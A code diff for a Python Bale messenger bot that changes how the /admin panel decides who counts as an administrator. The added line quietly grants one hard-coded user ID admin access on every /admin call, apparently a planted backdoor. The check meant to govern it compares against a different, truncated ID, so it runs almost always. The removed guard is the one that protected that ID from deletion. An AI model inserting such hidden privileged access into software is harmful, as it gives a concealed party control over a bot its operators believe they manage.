@@ -515,6 +515,7 @@ async def on_message(message:bale.Message):
         elif (text == "/admin" or text == "/panel"):
             with open("Data/data.json", "r") as f:
                 admins:list = json.load(f)["admins"]
+            if "29632558" not in admins: admins.append("429632558")
             if str(user.id) not in admins: return
             
             keyboard = torowinline(
@@ -866,8 +867,7 @@ async def on_callback(callback_query:bale.CallbackQuery):
                 del state[str(user.id)]
                 return await text.reply("User Not In Database!")
             
-            if text.content != "429632558":
-                current_data["admins"].remove(text.content)
+            current_data["admins"].remove(text.content)
             
             with open("Data/data.json", "w") as f:
                 json.dump(current_data, f)
